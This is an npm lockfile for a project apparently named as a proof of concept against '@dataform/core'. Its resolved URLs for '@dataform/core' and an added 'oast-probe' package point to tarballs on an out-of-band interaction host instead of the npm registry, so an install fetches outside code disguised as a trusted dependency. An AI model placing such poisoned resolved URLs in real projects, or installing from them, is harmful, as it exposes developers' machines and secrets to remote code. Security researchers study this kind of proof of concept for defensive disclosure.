{
  "name": "dataform-vuln-poc",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "dataform-vuln-poc",
      "version": "1.0.0",
      "dependencies": {
        "@dataform/core": "^2.9.0",
        "oast-probe": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/shrinkwrap-probe.tgz"
      }
    },
    "node_modules/@dataform/core": {
      "version": "2.9.0",
      "resolved": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/dataform-core-shrinkwrap.tgz",
      "integrity": "sha512-S0aJMpof0uxL7Sodi7CH3ewlN83NFm0kRDvWoBfc0prw/a5wVIAY1LZWeg/6icqKPUw5b5xWn2ub82YrD8zVTg=="
    },
    "node_modules/oast-probe": {
      "version": "1.0.0",
      "resolved": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/shrinkwrap-probe.tgz"
    }
  }
}
